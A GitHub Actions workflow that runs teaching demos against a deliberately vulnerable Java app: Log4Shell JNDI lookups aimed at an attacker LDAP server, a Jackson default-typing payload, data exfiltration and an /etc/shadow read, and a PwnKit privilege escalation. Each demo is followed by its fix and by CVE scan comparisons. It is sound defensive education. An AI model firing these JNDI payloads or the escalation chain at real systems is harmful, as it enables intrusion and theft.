name: "Vulnerable App — Full Demo"

on:
  push:
    branches: [ master ]
    paths: [ 'Vulnerable Application Old Java/**' ]
  workflow_dispatch:

# demo-* jobs each build their own step-summary AND upload it as a "demo-summary-*"
# artifact (see the "Save summary for GitHub Pages" step in every job below).
# publish-vulnerable-page collects all of them after every demo job has finished
# (success or failure) and republishes them as one page at
# https://johanjanssen.github.io/Keep-Up-To-Date/vulnerable/ — see that job for why.
jobs:
  # ═══════════════════════════════════════════════════════════════
  demo-log4shell:
    name: "💀 Demo 1 — Log4Shell RCE + Data Exfiltration"
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: "Vulnerable Application Old Java"

    steps:
      - uses: actions/checkout@v7

      - name: "🏗️ Build images"
        run: |
          docker build -f Dockerfile.root -t vuln-app:root .
          cd "../Callback Server" && docker build -t callback-server .

      - name: "🚀 Start infrastructure"
        run: |
          docker run -d --name callback -p 9999:9999 -p 1389:1389 callback-server
          docker run -d --name vuln-app \
            --add-host=host.docker.internal:host-gateway \
            -p 8080:8080 vuln-app:root
          for i in $(seq 1 30); do
            curl -s http://localhost:8080/hello > /dev/null 2>&1 && break
            sleep 2
          done

      - name: "📖 Demo 1 — Log4Shell"
        run: |
          source scripts/demo-log.sh

          cat >> "$S" << 'HEADER'
          ## 💀 Demo 1 — Log4Shell: From Search Query to Remote Code Execution

          **Scenario:** A developer builds a product search API. They log the search query —
          standard practice. The application uses `log4j-core 2.14.1` (Dec 2021, before the patch).

          ---

          ### 🏢 Victim's server — normal operation

          A legitimate user searches for products:
          HEADER

          run_json "curl \"http://victim:8080/api/products/search?q=shirt\"" \
            curl -s "http://localhost:8080/api/products/search?q=shirt"

          cat >> "$S" << 'DEV_CODE'
          Everything works normally. The developer's code:
          ```java
          log.info("Product search query: " + q);  // just logging — what could go wrong?
          ```

          ---

          ### 💀 Attacker's machine — sending the exploit

          The attacker replaces the search term with a JNDI lookup expression:
          DEV_CODE

          run_json "curl \"http://victim:8080/api/products/search?q=\${jndi:ldap://attacker:1389/pwned}\"" \
            curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D"

          cat >> "$S" << 'MECHANICS'
          The app answered normally above — **the victim doesn't notice anything.** Behind the
          scenes though:

          1. The search query arrives at the victim's controller
          2. The controller calls `log.info("Product search query: " + q)`
          3. Log4j 2.14.1 sees `${jndi:ldap://...}` and performs a network lookup
          4. The victim connects to the attacker's LDAP server (port 1389)
          5. The LDAP server tells the victim: *"load `ExploitPayload` class from `http://attacker:9999/exploit/`"*
          6. The victim downloads and executes the attacker's malicious Java class
          7. **The attacker now has Remote Code Execution inside the victim's container**

          ---

          ### 📡 Attacker's server — what the attacker sees

          The attacker's LDAP + HTTP server received connections from the victim:
          MECHANICS

          sleep 5
          run_pipe "docker logs callback   # (filtered to the interesting lines)" \
            'docker logs callback 2>&1 | grep -E "LDAP lookup|Serving malicious|FILE SERVER|Victim|bytes"'

          echo "### 🎯 Inside the victim's container — the exploit ran" >> "$S"
          echo "" >> "$S"
          echo "The attacker's code executed inside the victim. Here's what it did:" >> "$S"
          run_pipe "docker logs vuln-app   # (filtered to the interesting lines)" \
            'docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|Reconnaissance|User:|Hostname:|OS:|Stealing|shadow|Exfiltrat|Privilege escalation|Already root|Modified|read access|outbound|scan the internal|──"'

          cat >> "$S" << 'CONCLUSION'
          ### 💡 Key takeaway

          > **The developer did nothing wrong.** They just logged user input — standard practice.
          > The vulnerability is entirely in the **log4j-core 2.14.1 dependency**.
          > Updating to log4j 2.17+ or removing log4j-core completely prevents this attack.
          CONCLUSION

      - name: "📤 Save summary for GitHub Pages"
        if: always()
        run: cp "$GITHUB_STEP_SUMMARY" 01-log4shell.md || true

      - name: "🧹 Cleanup"
        if: always()
        run: docker stop vuln-app callback 2>/dev/null || true; docker rm vuln-app callback 2>/dev/null || true

      - name: "⬆️ Upload summary artifact"
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: demo-summary-01-log4shell
          path: "Vulnerable Application Old Java/01-log4shell.md"
          if-no-files-found: ignore

  # ═══════════════════════════════════════════════════════════════
  demo-jackson:
    name: "💀 Demo 2 — Jackson Deserialization"
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: "Vulnerable Application Old Java"

    steps:
      - uses: actions/checkout@v7

      - name: "🏗️ Build & start"
        run: |
          docker build -f Dockerfile.root -t vuln-app:root .
          cd "../Callback Server" && docker build -t callback-server . && cd -
          docker run -d --name callback -p 9999:9999 -p 1389:1389 callback-server
          docker run -d --name vuln-app --add-host=host.docker.internal:host-gateway -p 8080:8080 vuln-app:root
          for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done

      - name: "📖 Demo 2 — Jackson"
        run: |
          source scripts/demo-log.sh

          cat >> "$S" << 'HEADER'
          ## 💀 Demo 2 — Jackson Deserialization: Attacker Controls Your Objects

          **Scenario:** an internal "profile sync" endpoint between two Spring Boot services that
          share the same `ObjectMapper` config. That config has `enableDefaultTyping()` on — a
          deprecated-for-exactly-this-reason legacy setting still found in real codebases. Because of
          it, Jackson wraps every value in `["fully.qualified.ClassName", value]` on its own, on both
          sides — nobody hand-writes that shape, it's just what this stack's JSON looks like.
          Application uses `jackson-databind 2.13.4.1`.

          ---

          ### 🏢 Victim's server — normal use

          A legitimate service pushes a profile update (already in the wire format this stack always
          uses — this is not attacker-crafted, it's what `enableDefaultTyping()` produces automatically):
          HEADER

          run_json "curl -X POST \"http://victim:8080/api/users/import\" -d '[\"java.util.LinkedHashMap\", {\"name\":\"Alice\",\"email\":\"alice@conf.io\"}]'" \
            curl -s -X POST http://localhost:8080/api/users/import \
              -H "Content-Type: application/json" \
              -d '["java.util.LinkedHashMap", {"name":"Alice","email":"alice@conf.io"}]'

          cat >> "$S" << 'ATTACK'

          ---

          ### 💀 Attacker's machine — same shape, one field swapped

          The attacker doesn't need to send anything that looks unusual — they reach the same
          endpoint (e.g. because it's exposed further than intended) and swap **one nested value's**
          class inside an otherwise normal-looking wrapped profile. The top-level wrapper
          (`java.util.LinkedHashMap`) is exactly what a legitimate request looks like. Only the
          `email` field's class was swapped — `enableDefaultTyping()` applies the same "trust the
          client's class name" rule recursively to every nested value, not just the top level.
          ATTACK

          run_json "curl -X POST \"http://victim:8080/api/users/import\" -d '[\"java.util.LinkedHashMap\", {\"name\":\"Alice\",\"email\":[\"java.net.URL\",\"http://attacker:9999/jackson-rce-proof\"]}]'" \
            curl -s -X POST http://localhost:8080/api/users/import \
              -H "Content-Type: application/json" \
              -d '["java.util.LinkedHashMap", {"name":"Alice","email":["java.net.URL","http://host.docker.internal:9999/jackson-rce-proof"]}]'

          echo "The application's own logs already flagged it (defensive type-introspection logging, not a hack):" >> "$S"
          run_pipe "docker logs vuln-app | grep '\[import\]'" \
            'docker logs vuln-app 2>&1 | grep -E "\[import\]" | tail -6'

          cat >> "$S" << 'CONCLUSION'
          ### 💡 Key takeaway

          > **The `email` field deserialized as `java.net.URL`, not `String` — proof the attacker
          > controlled which Java class got instantiated,** hidden inside a request that otherwise
          > looked exactly like normal internal traffic.
          >
          > In this demo we used `java.net.URL` (harmless — it doesn't connect on construction). In a
          > real attack, the attacker uses gadget classes like `JdbcRowSetImpl` (triggers JNDI → RCE)
          > or `TemplatesImpl` (executes arbitrary bytecode) — same result as Log4Shell.
          >
          > **Fix:** Never use `enableDefaultTyping()`. Use `@JsonTypeInfo` with an explicit allow-list
          > instead. Update jackson-databind to the latest version.
          CONCLUSION

      - name: "📤 Save summary for GitHub Pages"
        if: always()
        run: cp "$GITHUB_STEP_SUMMARY" 02-jackson.md || true

      - name: "🧹 Cleanup"
        if: always()
        run: docker stop vuln-app callback 2>/dev/null; docker rm vuln-app callback 2>/dev/null

      - name: "⬆️ Upload summary artifact"
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: demo-summary-02-jackson
          path: "Vulnerable Application Old Java/02-jackson.md"
          if-no-files-found: ignore

  # ═══════════════════════════════════════════════════════════════
  demo-full-chain:
    name: "💀 Demo 3 — Log4Shell → RCE → Root Access"
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: "Vulnerable Application Old Java"

    steps:
      - uses: actions/checkout@v7

      - name: "🏗️ Build all images"
        run: |
          docker build -f Dockerfile.root -t vuln-app:root .
          docker build -f Dockerfile.escalation -t vuln-app:escalation .
          docker build -f Dockerfile.nonroot -t vuln-app:safe .
          cd "../Callback Server" && docker build -t callback-server .

      - name: "🚀 Start attacker + victim (root image)"
        run: |
          docker run -d --name callback -p 9999:9999 -p 1389:1389 callback-server
          docker run -d --name vuln-app \
            --add-host=host.docker.internal:host-gateway \
            -p 8080:8080 vuln-app:root
          for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done

      - name: "📖 Demo 3 — Full chain on ROOT image"
        run: |
          source scripts/demo-log.sh

          cat >> "$S" << 'HEADER'
          ## 💀 Demo 3 — One HTTP Request → Full Server Compromise

          **Scenario:** Same Log4Shell attack, but now we look at what the attacker
          does AFTER getting code execution. Two images compared:
          - 🔴 **Root image** — runs as root, old OS, has gcc/curl/wget
          - 🟢 **Safe image** — runs as non-root, modern OS, no extra tools

          ---

          ### 🔴 Attack on ROOT image
          HEADER

          run_live "curl -o /dev/null -w '%{http_code}\n' \"http://victim:8080/api/products/search?q=\${jndi:ldap://attacker:1389/pwned}\"" \
            curl -s -o /dev/null -w '%{http_code}\n' "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D"
          sleep 6

          echo "#### 🎯 What the attacker's code did inside the ROOT container:" >> "$S"
          run_pipe "docker logs vuln-app   # (filtered to the interesting lines)" \
            'docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|Reconnaissance|User:|Hostname:|OS:|Stealing|shadow|root:|Exfiltrat|HTTP|Privilege escalation|Already root|Modified|SSH|create users|pivot|──|\[" | head -30'

          echo "#### 📡 Attacker's server received the stolen data:" >> "$S"
          run_pipe "docker logs callback | grep -A5 stolen-data" \
            'docker logs callback 2>&1 | grep -A5 "stolen-data" | head -10'

          cat >> "$S" << 'ROOT_IMPACT'
          > **Impact on ROOT image:** The attacker read `/etc/shadow` (password hashes),
          > modified system files, and exfiltrated data. Full server compromise from a single HTTP request.

          ---

          ROOT_IMPACT

      - name: "🔒 Same attack on SAFE image"
        run: |
          source scripts/demo-log.sh

          docker stop vuln-app 2>/dev/null; docker rm vuln-app 2>/dev/null
          # Clear callback dashboard
          curl -s -X DELETE http://localhost:9999/dashboard > /dev/null || true

          docker run -d --name vuln-app \
            --add-host=host.docker.internal:host-gateway \
            -p 8080:8080 vuln-app:safe
          for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done

          cat >> "$S" << 'HEADER'
          ### 🟢 Same attack on SAFE image

          Same exploit, same application JAR, but different container configuration:
          HEADER

          run_live "curl -o /dev/null -w '%{http_code}\n' \"http://victim:8080/api/products/search?q=\${jndi:ldap://attacker:1389/pwned}\"   # exact same command as above" \
            curl -s -o /dev/null -w '%{http_code}\n' "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D"
          sleep 4

          echo "#### Result on SAFE image:" >> "$S"
          run_pipe "docker logs vuln-app | tail -8" 'docker logs vuln-app 2>&1 | tail -8'

          cat >> "$S" << 'SAFE_RESULT'
          > **The JNDI lookup is blocked.** Java 25 defaults `com.sun.jndi.ldap.object.trustURLCodebase=false`,
          > preventing the JVM from loading remote classes. The attack fails silently.
          >
          > Even if it weren't blocked: no `curl` (can't download exploits), no `gcc` (can't compile),
          > no `pkexec` (can't escalate), non-root user (can't read `/etc/shadow`).

          ---

          ### 💡 Comparison

          | | 🔴 Root image | 🟢 Safe image |
          |---|---|---|
          | **JNDI class loading** | ✅ Succeeds (trustURLCodebase=true) | ❌ Blocked (default) |
          | **Read /etc/shadow** | ✅ Root can read everything | ❌ Permission denied |
          | **Exfiltrate data** | ✅ curl available | ❌ No curl/wget |
          | **Compile exploits** | ✅ gcc installed | ❌ No compiler |
          | **Base image CVEs** | Hundreds (Ubuntu 22.04) | Near zero (modern) |

          > **The same vulnerable JAR runs in both containers.** The difference is entirely
          > in the container configuration. Keep your base images updated and minimal.
          SAFE_RESULT

      - name: "📤 Save summary for GitHub Pages"
        if: always()
        run: cp "$GITHUB_STEP_SUMMARY" 03-full-chain.md || true

      - name: "🧹 Cleanup"
        if: always()
        run: docker stop vuln-app callback 2>/dev/null; docker rm vuln-app callback 2>/dev/null

      - name: "⬆️ Upload summary artifact"
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: demo-summary-03-full-chain
          path: "Vulnerable Application Old Java/03-full-chain.md"
          if-no-files-found: ignore

  # ═══════════════════════════════════════════════════════════════
  demo-privilege-escalation:
    name: "💀 Demo 4 — Low-Priv RCE + OS Package Privilege Escalation"
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: "Vulnerable Application Old Java"

    steps:
      - uses: actions/checkout@v7

      - name: "🏗️ Build images"
        run: |
          docker build -f Dockerfile.escalation -t vuln-app:escalation .
          cd "../Callback Server" && docker build -t callback-server .

      - name: "🚀 Start infrastructure (escalation image — non-root, but old OS packages)"
        run: |
          docker run -d --name callback -p 9999:9999 -p 1389:1389 callback-server
          docker run -d --name vuln-app \
            --add-host=host.docker.internal:host-gateway \
            -p 8080:8080 vuln-app:escalation
          for i in $(seq 1 30); do
            curl -s http://localhost:8080/hello > /dev/null 2>&1 && break
            sleep 2
          done

      - name: "📖 Demo 4 — Scenario"
        run: |
          S=$GITHUB_STEP_SUMMARY
          cat >> "$S" << 'HEADER'
          ## 💀 Demo 4 — "We Run As Non-Root" Is Not the Whole Story

          **Scenario:** same Log4Shell exploit as Demo 1, but this image runs the app as
          `appuser` (uid 1000), not root — the "we fixed it, we're non-root now" response teams
          often give. It still ships `policykit-1` (contains the SUID `pkexec` binary,
          historically `CVE-2021-4034` / "PwnKit") and a full `gcc` toolchain. After the initial
          Java-library RCE, the attacker's payload fetches a **second-stage OS-package exploit**
          from its own staging server — exactly what real intrusions do: land with an initial
          foothold, then pull down more powerful tools rather than carry everything at once.
          HEADER

      - name: "🔎 Live baseline — proving appuser is real, before any exploit runs"
        run: |
          source scripts/demo-log.sh

          cat >> "$S" << 'BASELINE_INTRO'

          ### 🔎 Baseline — live `docker exec` against the container this job is running right now

          Not a log excerpt — these commands run against the actual container, on the actual
          GitHub Actions runner, seconds before the exploit fires:
          BASELINE_INTRO

          run_live "docker exec vuln-app id" docker exec vuln-app id
          run_live "docker exec vuln-app ls -l /usr/bin/pkexec" docker exec vuln-app ls -l /usr/bin/pkexec
          run_pipe "docker exec vuln-app dpkg -s policykit-1 | grep Version" \
            "docker exec vuln-app dpkg -s policykit-1 2>/dev/null | grep Version"

          cat >> "$S" << 'BASELINE_OUTRO'
          Confirmed live: the app really runs as `uid=1000(appuser)`, and `pkexec` really
          carries the SUID bit (`rws`) — it runs as root no matter which user invokes it.

          ---

          ### 💀 Attacker's machine — same exploit as Demo 1
          ```bash
          # On: Attacker's machine
          curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwnkit}"
          ```
          BASELINE_OUTRO

      - name: "💀 Fire the exploit"
        run: |
          source scripts/demo-log.sh

          echo "" >> "$S"
          echo "Sent live at \`$(date -u +%H:%M:%S) UTC\` from this runner:" >> "$S"

          run_live "curl -w '%{http_code}\n' \"http://victim:8080/api/products/search?q=\${jndi:ldap://attacker:1389/pwnkit}\"" \
            curl -s -o /dev/null -w '%{http_code}\n' "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Fpwnkit%7D"

          echo "" >> "$S"
          echo "The app answered normally — the exploit runs invisibly in the background. Watch it" >> "$S"
          echo "happen live in the next step." >> "$S"

      - name: "⏳ Watching it happen — live telemetry from both containers"
        run: |
          source scripts/demo-log.sh

          cat >> "$S" << 'WATCH_INTRO'

          ### ⏳ Watching the attack unfold in real time

          Polling `docker logs` on both running containers, once a second, printing each
          milestone the instant it appears — this is the real order of events, not a canned
          transcript. Each milestone shows two lines: the **raw line the container actually
          printed** (proof this is really happening), then what it means:
          WATCH_INTRO
          echo '```console' >> "$S"

          MARKERS=(
            "callback|LDAP lookup received|📡 [callback] attacker's LDAP server received the JNDI callback"
            "vuln-app|REMOTE CODE EXECUTION ACHIEVED|💥 [vuln-app] victim loaded the attacker's Java class — RCE confirmed"
            "vuln-app|Not root. Fetching second-stage|🎣 [vuln-app] payload confirms it is not root — fetching PwnKit from the attacker's server"
            "callback|Victim downloaded PwnKit shell script|📡 [callback] attacker's server saw the victim fetch pwnkit.sh"
            "vuln-app|FOUND: pkexec SUID root|🔎 [vuln-app] payload found pkexec (SUID root) inside the container"
            "vuln-app|HTTP 200 — data sent to attacker|📤 [vuln-app] stolen recon data POSTed back to the attacker"
            "vuln-app|ESCALATION SUCCEEDED|👑 [vuln-app] pkexec exploited — payload is now running as root"
          )
          declare -A SEEN
          DONE=0

          # Each milestone is `tee`d, not just redirected — so this loop's progress is
          # visible live in the Actions log while it's still running, not only in the
          # rendered summary after the fact. The RAW line is the actual `docker logs`
          # output that matched — not the friendly LABEL — so what's on screen is real
          # command output, not narration standing in for it.
          for i in $(seq 1 20); do
            for m in "${MARKERS[@]}"; do
              IFS='|' read -r CONTAINER PATTERN LABEL <<< "$m"
              if [ -n "${SEEN[$m]:-}" ]; then continue; fi
              RAW=$(docker logs "$CONTAINER" 2>&1 | grep -F "$PATTERN" | head -1) || true
              if [ -n "$RAW" ]; then
                SEEN[$m]=1
                {
                  printf '[+%02ds] %s: %s\n' "$i" "$CONTAINER" "$(echo "$RAW" | sed 's/^ *//')"
                  printf '[+%02ds]   └─ %s\n' "$i" "$LABEL"
                } | tee -a "$S"
              fi
            done
            BANNERS=$(docker logs vuln-app 2>&1 | grep -c "══════" || true)
            if [ "${BANNERS:-0}" -ge 3 ]; then
              DONE=1
              printf '[+%02ds] 🏁 payload finished executing inside the victim container\n' "$i" | tee -a "$S"
              break
            fi
            sleep 1
          done
          [ "$DONE" -eq 1 ] || echo "⏱️  stopped polling after 20s — showing whatever landed by then" | tee -a "$S"
          echo '```' >> "$S"

      - name: "🎯 Forensics — proof this ran on a real machine"
        run: |
          source scripts/demo-log.sh

          cat >> "$S" << 'FORENSICS_INTRO'

          ### 🎯 Forensics — what the exploit left behind inside `vuln-app`

          The attacker's second-stage script downloaded, compiled, and ran a real C exploit
          *inside this container* moments ago. It's still there — this isn't a description,
          it's `docker exec` reading the container's actual `/tmp` right now:
          FORENSICS_INTRO

          run_live "docker exec vuln-app ls -la /tmp" docker exec vuln-app ls -la /tmp
          run_live "docker exec vuln-app stat /tmp/pwnkit" docker exec vuln-app stat /tmp/pwnkit
          run_live "docker exec vuln-app id   # (the long-lived container process — still appuser)" \
            docker exec vuln-app id

          echo "### 📜 Full annotated log recap" >> "$S"
          run_pipe "docker logs vuln-app   # (filtered to the interesting lines)" \
            'docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|User:|Hostname:|OS:|shadow|Privilege escalation|Not root|Fetching|PwnKit|pkexec|gcc|FOUND|FAIL|Escalating|ESCALATION SUCCEEDED|Current user|Regardless|✓|──"'

      - name: "💡 Verdict"
        run: |
          source scripts/demo-log.sh

          if docker logs vuln-app 2>&1 | grep -q "ESCALATION SUCCEEDED"; then
            cat >> "$S" << 'PROOF_INTRO'

          ### 🔓 Proof — running the exploit again, live, right now

          The compiled exploit is still sitting in the container as `/tmp/pwnkit` (see the
          forensics step above). Not a log excerpt — let's run it again, live, against the
          actual container, and watch it escalate from `appuser` to root in real time:
          PROOF_INTRO

            run_live "docker exec -w /tmp vuln-app ./pwnkit" docker exec -w /tmp vuln-app ./pwnkit

            cat >> "$S" << 'ESCALATED'

          ### 💡 Key takeaway

          > **Full compromise from a single HTTP request, despite running as non-root.** The
          > Java library vulnerability (Log4Shell) got the attacker in the door; the OS package
          > vulnerability (unpatched `pkexec`) got them root. Neither layer alone would have been
          > enough — both had to be out of date at the same time.
          ESCALATED
          else
            cat >> "$S" << 'BLOCKED'

          ### 💡 Key takeaway

          > **The Java-library RCE still worked exactly like Demo 1** — non-root didn't stop that
          > part at all. The privilege-escalation attempt against `pkexec` was blocked here because
          > this build pulled a **patched** `policykit-1` from today's package mirror — Ubuntu fixed
          > CVE-2021-4034 back in January 2022. That's not this demo failing, it's the actual point:
          > on a system that *hadn't* been patched (which describes a lot of long-lived internal
          > servers), this exact chain — old Java library in, old OS package up to root — would have
          > worked all the way through. "We're non-root" is not a substitute for keeping the OS
          > patched; it just removes one of several paths to the same outcome.
          BLOCKED
          fi

      - name: "📤 Save summary for GitHub Pages"
        if: always()
        run: cp "$GITHUB_STEP_SUMMARY" 04-privilege-escalation.md || true

      - name: "🧹 Cleanup"
        if: always()
        run: docker stop vuln-app callback 2>/dev/null || true; docker rm vuln-app callback 2>/dev/null || true

      - name: "⬆️ Upload summary artifact"
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: demo-summary-04-privilege-escalation
          path: "Vulnerable Application Old Java/04-privilege-escalation.md"
          if-no-files-found: ignore

  # ═══════════════════════════════════════════════════════════════
  scan-compare:
    name: "📊 CVE Scan — Image Comparison"
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: "Vulnerable Application Old Java"

    steps:
      - uses: actions/checkout@v7

      - name: "🏗️ Build all images"
        run: |
          docker build -f Dockerfile.root -t vuln-app:root .
          docker build -f Dockerfile.escalation -t vuln-app:escalation .
          docker build -f Dockerfile.nonroot -t vuln-app:safe .

      - name: "🔍 Install Trivy"
        run: curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin

      - name: "📊 Scan & compare"
        run: |
          source scripts/demo-log.sh

          cat >> "$S" << 'HEADER'
          ## 📊 Image Security Comparison

          Three Docker images running the **exact same application JAR**, but with
          different base images and configurations:

          HEADER

          declare -A TOTALS CRITS HIGHS SIZES

          for IMG in root escalation safe; do
            JSON=$(trivy image --format json --quiet "vuln-app:$IMG" 2>/dev/null || echo '{"Results":[]}')
            TOTALS[$IMG]=$(echo "$JSON" | python3 -c "import json,sys; d=json.load(sys.stdin); print(sum(len(r.get('Vulnerabilities',[])) for r in d.get('Results',[])))" 2>/dev/null || echo "0")
            CRITS[$IMG]=$(echo "$JSON" | python3 -c "import json,sys; d=json.load(sys.stdin); print(sum(1 for r in d.get('Results',[]) for v in r.get('Vulnerabilities',[]) if v.get('Severity')=='CRITICAL'))" 2>/dev/null || echo "0")
            HIGHS[$IMG]=$(echo "$JSON" | python3 -c "import json,sys; d=json.load(sys.stdin); print(sum(1 for r in d.get('Results',[]) for v in r.get('Vulnerabilities',[]) if v.get('Severity')=='HIGH'))" 2>/dev/null || echo "0")
            SIZES[$IMG]=$(docker image inspect "vuln-app:$IMG" --format='{{.Size}}' | awk '{printf "%.0f", $1/1024/1024}')
          done

          cat >> "$S" << TABLE
          | Metric | 🔴 root | ⚠️ escalation | 🟢 safe |
          |--------|---------|---------------|---------|
          | Total CVEs | ${TOTALS[root]} | ${TOTALS[escalation]} | ${TOTALS[safe]} |
          | CRITICAL | ${CRITS[root]} | ${CRITS[escalation]} | ${CRITS[safe]} |
          | HIGH | ${HIGHS[root]} | ${HIGHS[escalation]} | ${HIGHS[safe]} |
          | Image Size | ${SIZES[root]} MB | ${SIZES[escalation]} MB | ${SIZES[safe]} MB |
          | User | root | appuser | ubuntu |
          | Has curl/gcc/pkexec | ✅ | ✅ | ❌ |
          | Base image | temurin:11-jre-jammy | temurin:11-jre-jammy | temurin:25-jre |

          TABLE

          echo "### 🔴 Top vulnerabilities — vuln-app:root" >> "$S"
          run_pipe "trivy image --severity CRITICAL,HIGH vuln-app:root" \
            "trivy image --severity CRITICAL,HIGH --no-progress vuln-app:root 2>/dev/null | head -50"

          echo "### 🟢 Scan — vuln-app:safe" >> "$S"
          run_pipe "trivy image --severity CRITICAL,HIGH vuln-app:safe" \
            "trivy image --severity CRITICAL,HIGH --no-progress vuln-app:safe 2>/dev/null | head -50"

      - name: "📤 Save summary for GitHub Pages"
        if: always()
        run: cp "$GITHUB_STEP_SUMMARY" 05-scan-compare.md || true

      - name: "⬆️ Upload summary artifact"
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: demo-summary-05-scan-compare
          path: "Vulnerable Application Old Java/05-scan-compare.md"
          if-no-files-found: ignore

  # ═══════════════════════════════════════════════════════════════
  publish-vulnerable-page:
    name: "📄 Publish GitHub Pages — /vulnerable"
    runs-on: ubuntu-latest
    needs: [ demo-log4shell, demo-jackson, demo-full-chain, demo-privilege-escalation, scan-compare ]
    # Always publish whatever summaries did get produced, even if one demo job failed
    # or was skipped — a partial live report is more useful than none.
    if: always()
    permissions:
      contents: write
    # See static.yml / compare-scans.yml for why each gh-pages-publishing workflow
    # gets its own concurrency group instead of sharing one.
    concurrency:
      group: "gh-pages-deploy-vulnerable"
      cancel-in-progress: false

    steps:
      - uses: actions/checkout@v7

      - name: "⬇️ Download all demo summaries"
        uses: actions/download-artifact@v4
        with:
          pattern: "demo-summary-*"
          path: /tmp/summaries
          merge-multiple: true

      - name: "🐍 Install markdown renderer"
        run: pip install markdown -q

      - name: "🏗️ Generate the /vulnerable report page"
        run: |
          python3 "Vulnerable Application Old Java/scripts/generate-vulnerable-report.py" \
            /tmp/summaries \
            "Vulnerable Application Old Java/target/vulnerable/index.html" \
            --title "Vulnerable App — Live Exploit Demos" \
            --run-url "${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"

      - name: "📁 Prepare Pages directory"
        run: |
          mkdir -p tmp/pages
          cp "Vulnerable Application Old Java/target/vulnerable/index.html" tmp/pages/

      # Published as its own subfolder, same pattern as compare-scans.yml's Scans/ deploy
      # — see that workflow for why peaceiris + destination_dir is used instead of
      # actions/deploy-pages here.
      - name: "🚀 Deploy to GitHub Pages (vulnerable/ subfolder)"
        uses: Wandalen/wretry.action@v3
        with:
          action: peaceiris/actions-gh-pages@v4
          attempt_limit: 3
          attempt_delay: 5000
          with: |
            github_token: ${{ secrets.GITHUB_TOKEN }}
            publish_dir: tmp/pages
            destination_dir: vulnerable
            keep_files: true

      # Now the report is available under https://johanjanssen.github.io/Keep-Up-To-Date/vulnerable/
